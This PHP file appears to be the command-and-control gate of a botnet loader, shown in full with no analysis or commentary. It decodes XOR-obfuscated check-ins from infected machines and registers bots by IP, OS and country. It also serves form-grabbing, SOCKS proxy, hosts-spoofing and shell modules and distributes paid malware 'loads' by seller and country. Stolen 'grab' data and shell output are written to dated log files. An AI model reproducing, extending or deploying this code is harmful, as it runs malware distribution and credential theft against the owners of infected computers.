<?php

error_reporting(0);
ini_set("max_execution_time", 0);

require("./inc/cfg.php");
require('./inc/geoip.php');
require("./inc/funcs.php");

$logs=$_POST["cmd"];
$ip=$_SERVER['REMOTE_ADDR'];

if (!isset($logs)) {

$input = file_get_contents("php://input");
if (strlen($input)>70000) exit;
$input = base64_decode($input);
$xor = $input[0];
$len = substr($input,1,4);
$ff = unpack("i", $len);
$len = $ff[1]+5;
if ($len>70000) exit;
$data = '';
		for ($i = 5; $i < $len; $i++){
		$data .= chr(ord($input[$i]) ^ ord($xor));
		}

$tmp=explode('&',$data);
	foreach	($tmp as $value) {
		list($key,$val)=explode('=',$value);
		$cmd[$key]=$val;
	}

$dbase = new dbClass();
$command=$cmd["cmd"];
$login=preg_replace('/(\W|\_)/', '',$cmd["login"]);
$sel=$cmd["sel"];
$os=get_os($cmd["ver"]);
$bits=$cmd["bits"];
$file=$cmd["file"];
$state=$cmd["run"];
$port=$cmd["port"];

if ($command == "getgrab") {
	getmodule("./mods/grab");
	exit;
} elseif ($command == "getproxy") {
	getmodule("./mods/socks");
	exit;	
} elseif ($command == "getspoof") {
	getmodule("./mods/hosts");
	exit;	
} elseif ($command == "getcmdshell") {
	getmodule("./mods/shell");
	exit;	
} elseif ($command == "getload" && isset($cmd["doubles"])) {
	mysql_query("UPDATE bots SET doub=1 WHERE cname='".$login."'");
	exit;
} elseif ($command == "getload" && isset($cmd["final"])) {
	mysql_query("UPDATE bots SET work=0, seller='".$sel."' WHERE cname='".$login."'");
	exit;
} elseif ($command == "getload" && isset($cmd["personal"])) {
	$v = mysql_query("SELECT * FROM bots WHERE cname='".$login."'");
	$i = mysql_fetch_assoc($v);
		if ($i['personal']=='0') exit;
	$id = $i['id'];
	$v = mysql_query("SELECT * FROM personal WHERE botid='".$id."'");
	if ($v) {
		$i = mysql_fetch_assoc($v);
		if ($i['task']=='local') {
			mysql_query("UPDATE bots SET personal=0 WHERE cname='".$login."'");
			getfile("p".$id.".tmp",$i['isdll']);
		} else {
			mysql_query("UPDATE bots SET personal=0 WHERE cname='".$login."'");
			geturl($i["task"],$i['isdll']);
		}
	}
	exit;
} elseif ($command == "getload" && !isset($cmd["file"])) {
	$country = get_country($ip);
	$v = mysql_query("SELECT * FROM bots WHERE cname='".$login."'");
	if (mysql_num_rows($v) !== 0) {
	$i = mysql_fetch_assoc($v);
		if ($i['upd']=='1') {echo 'Smku'; exit;}
		if ($i['personal']=='1') {echo 'Smki'; exit;}
		if ($i['work']=='1') {
		$x=mysql_query("SELECT COUNT(*) FROM sellers");
		$files=0;
			if ($x) {$files = mysql_result($x,0);}
		echo 'Smk'.$files;
		} else echo 'Smk0';
	mysql_query("UPDATE bots SET ip='".$ip."',time ='".time()."' WHERE cname='".$login."'");
	} else {
	mysql_query("INSERT INTO `bots` (`id`, `ip`, `os`, `country`, `time`, `cname`, `work`, `seller`, `bits`) VALUES ('', '".$ip."', '".$os."', '".$country."', '".time()."', '".$login."', '1', '".$sel."', '".$bits."') ON DUPLICATE KEY UPDATE time=".time().";");
		$x=mysql_query("SELECT COUNT(*) FROM sellers");
		$files=0;
			if ($x) {$files = mysql_result($x,0);}
		echo 'Smk'.$files;
	}
	exit;
} elseif ($command == "getload" && isset($cmd["file"]) && ($cmd["file"]!='u') && ($cmd["file"]!='r') && !isset($cmd["run"])) {
	$v = mysql_query("SELECT * FROM bots WHERE cname='".$login."'");
	if (mysql_num_rows($v) !== 0) {
	$i = mysql_fetch_assoc($v);
		if ($i['work']=='0') exit;
	} else exit;
	$v = mysql_query("SELECT * FROM sellers ORDER BY id ASC LIMIT ".$file.",1");
	$load = mysql_fetch_assoc($v);
	$limit = $load['limit'];
		if ($limit>0) {
		$curload = $load['loads'];
			if ($curload >= $limit) exit;
		}
	$country = strtolower(get_country($ip));
	$loadc = explode(",", $load['country']);
		if ($loadc[0]!='all') {
		if (!in_array($country,$loadc)) exit;
		}
	if (($load["stop"] == 0) && ($load["seller"] == $sel)) {
		if (strlen($load["from"])>10) {
		mysql_query("UPDATE sellers SET loads=loads+1 WHERE id='".$load["id"]."'");	
		geturl($load["from"],$load['isdll']);
		}	else {
		mysql_query("UPDATE sellers SET loads=loads+1 WHERE id='".$load["id"]."'");	
		getfile($load["id"].".tmp",$load['isdll']);
		}	
		}
	if (($load["stop"] == 0) && ($load["seller"] == '0')) {
		if (strlen($load["from"])>10) {
		mysql_query("UPDATE sellers SET loads=loads+1 WHERE id='".$load["id"]."'");	
		geturl($load["from"],$load['isdll']);
		}	else {
		mysql_query("UPDATE sellers SET loads=loads+1 WHERE id='".$load["id"]."'");	
		getfile($load["id"].".tmp",$load['isdll']);
		}	
		}
	exit;
} elseif ($command == "getload" && isset($cmd["file"]) && ($cmd["file"]!='u') && ($cmd["file"]!='r') && isset($cmd["run"])) {
	$v = mysql_query("SELECT * FROM bots WHERE cname='".$login."'");
	if (mysql_num_rows($v) !== 0) {
	$i = mysql_fetch_assoc($v);
		if ($i['work']=='0') exit;
	} else exit;
		if ($state == "ok") {
		$v = mysql_query("SELECT * FROM sellers ORDER BY id ASC LIMIT ".$file.",1");
		$load = mysql_fetch_assoc($v);
		mysql_query("UPDATE sellers SET runs=runs+1 WHERE id='".$load["id"]."'");	
		}
	exit;
} elseif ($command == "getload" && ($cmd["file"]=='u')&& !isset($cmd["run"])) {
	$v = mysql_query("SELECT * FROM bots WHERE cname='".$login."'");
	$bot = mysql_fetch_assoc($v);
		if ($bot["upd"]=='1') {
		$v = mysql_query("SELECT * FROM `update`");
		$upd = mysql_fetch_assoc($v);
			if (strlen($upd["from"])>10) {
			geturl($upd["from"],0);
			} elseif ($upd["from"]=='local') {
			getfile("update.exe",0);
			}
		}
	exit;
} elseif ($command == "getload" && ($cmd["file"]=='u')&& isset($cmd["run"])) {
	if ($state == "ok") {
	mysql_query("UPDATE bots SET upd=0 WHERE cname='".$login."'");
	} 
	exit;
} elseif ($command == "getload" && ($cmd["file"]=='r')&& !isset($cmd["run"])) {
	$v = mysql_query("SELECT * FROM `options`");
	$data = mysql_fetch_assoc($v);
	$reserve = $data["reserv"];
	if (strlen($reserve)>7) {
	$xor = chr(rand(10,31));
	$result = $xor;
		for ($i = 0; $i < strlen($reserve); $i++){
		$result .= $reserve[$i] ^ $xor;
		}
	echo $result;
	}
	exit;
} elseif ($command == "getsocks" && isset($port)) {
	$country = get_country($ip);
	$sock = @fsockopen("tcp://$ip", $port, $a, $a, 2);
	if (!$sock) exit;
	$v = mysql_query("SELECT valid FROM socksip");
	if (mysql_num_rows($v) !== 0) {
	$i = mysql_fetch_assoc($v);
	echo $i['valid'];
	} else echo '127.0.0.1';
	$v = mysql_query("SELECT * FROM socks WHERE cname='".$login."'");
	if (mysql_num_rows($v) !== 0) {
	mysql_query("UPDATE socks SET ip='".$ip."',time ='".time()."',port='".$port."' WHERE cname='".$login."'");
	} else {
	mysql_query("INSERT INTO `socks` (`id`, `ip`, `port`, `country`, `time`, `cname`) VALUES ('', '".$ip."', '".$port."', '".$country."', '".time()."', '".$login."') ON DUPLICATE KEY UPDATE time=".time().";");
	}
	exit;
} elseif ($command == "gethosts") {
	if ($state == "ok") {
	mysql_query("UPDATE bots SET spoofed=1 WHERE cname='".$login."'");
	exit;
	}
	
	$v = mysql_query("SELECT * FROM bots WHERE cname='".$login."'");
	if (mysql_num_rows($v) !== 0) {
	$i = mysql_fetch_assoc($v);
		if ($i['spoofed']=='1') {echo '0'; exit;}
		
		$v = mysql_query("SELECT hosts FROM socksip");
		if (mysql_num_rows($v) !== 0) {
		$i = mysql_fetch_assoc($v);
		echo $i['hosts'];
		} else echo '127.0.0.1 localhost';
	}
	exit;
} elseif ($command == "getshell") {
	if ($state == "ok") {
	mysql_query("UPDATE bots SET shell=1 WHERE cname='".$login."'");
	$data = base64_decode($cmd["shell"]);
	$country = get_country($ip);
	$date = date("d.m.Y H:i:s");
	$fn = date("d.m.Y");	
	savefile("./shell/".$fn."-shell.txt", "++ IP Address: {$ip} | From: {$country} | ID: {$login} | Date: {$date} ++\r\n\r\n" . $data . "\r\n");
	exit;
	}

	$v = mysql_query("SELECT * FROM bots WHERE cname='".$login."'");
	$i = mysql_fetch_assoc($v);
		if ($i['shell']=='1') {echo ''; exit;}
		
		$v = mysql_query("SELECT shell FROM socksip");
		if (mysql_num_rows($v) !== 0) {
		$i = mysql_fetch_assoc($v);
		echo $i['shell'];
		} else echo '';
	exit;
} else
{
include("404.php");
exit;
}
} elseif (isset($logs) && $logs == "grab") {
	$data = trim($_POST["data"]);
	$data = str_replace(" ", "+", $data);
	$data = base64_decode($data);
	$login = $_POST["login"];
	$country = get_country($ip);
	$date = date("d.m.Y H:i:s");
	$fn = date("d.m.Y");
	savefile("./data/".$fn."-data.txt", "++ IP Address: {$ip} | From: {$country} | ID: {$login} | Date: {$date} ++\r\n\r\n" . $data . "\r\n");
	exit;
}else
{
include("404.php");
exit;
}

?>